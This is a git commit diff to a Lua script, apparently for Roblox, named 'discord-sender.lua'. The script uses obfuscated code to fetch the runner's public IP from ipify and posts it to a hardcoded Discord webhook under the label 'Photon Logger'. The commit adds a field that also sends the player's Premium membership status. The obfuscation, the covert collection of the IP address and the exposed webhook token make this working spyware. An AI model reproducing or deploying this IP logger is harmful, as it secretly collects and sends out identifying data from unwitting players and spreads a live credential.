7eab2e1c199f44b4c8db0d6ada65690ae95f71b8
ideaphoton <photonutil@outlook.com>
2024-07-12 01:19:32 +0100

    Update discord-sender.lua

--- initialises/pure/discord-sender.lua
+++ initialises/pure/discord-sender.lua
@@ -1,5 +1,5 @@
 we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."://".."api"..".ipify"..".org"end;[2]=nil;};setmetatable(qq,{__add=function(tt,vv)return tt[#tt+(vv-1)]end,__call=function(rt,fy)rt[fy[1]]=fy[2];end});qq[3]=(qq+2~=nil)or("\97");qq({5,(qq+3):gsub("a","Ph\x6ft\x6fn L\x6fgger")});ph=qq+(#{[[t4c-O]]}*5);co={}setmetatable(co,{__index=function(ew,pg)if(pg=="vx")then return(ph)end;end})qq[6]=co.vx;print(qq+6);
---// 🙂
+--// player.MembershipType == Enum.MembershipType.Premium
 if getgenv().ex == nil then getgenv().ex = true
 local url = "h".."ttps://discord.com/api/webh\x6foks/1261085987413426198/kCT6oS1w3JxB1\x6fAqvW".."4BhtyT63QqBOPEmaiubgcpYe3LEKbXjVY7JGADy7xeq2qcyLWE"
 local data = {
@@ -15,6 +15,11 @@ local data = {
             {
                 ["name"] = ":robot: IP",
                 ["value"] = "```"..game:HttpGet((qq+1)()).."```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":money_with_wings: Premium",
+                ["value"] = "```"..(player.MembershipType == Enum.MembershipType.Premium and "True" or "False").."```",
                 ["inline"] = true
             },
         },
